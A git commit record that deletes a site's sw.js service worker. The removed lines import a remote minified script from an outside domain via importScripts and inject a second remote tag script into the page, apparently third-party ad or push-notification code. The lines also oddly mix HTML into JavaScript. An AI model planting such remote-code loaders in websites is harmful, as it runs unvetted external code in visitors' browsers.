943de80d9daee76aaade2111bd5edab4260b7736
mdfazlerabbi2060-cmd <mdfazlerabbi2060@gmail.com>
2026-06-20 10:09:47 +0600

    Delete sw.js

--- sw.js
+++
@@ -1,7 +0,0 @@
-self.options = {
-    "domain": "5gvci.com",
-    "zoneId": 11175422
-}
-self.lary = ""
-importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
-<script>(function(s){s.dataset.zone='11175440',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
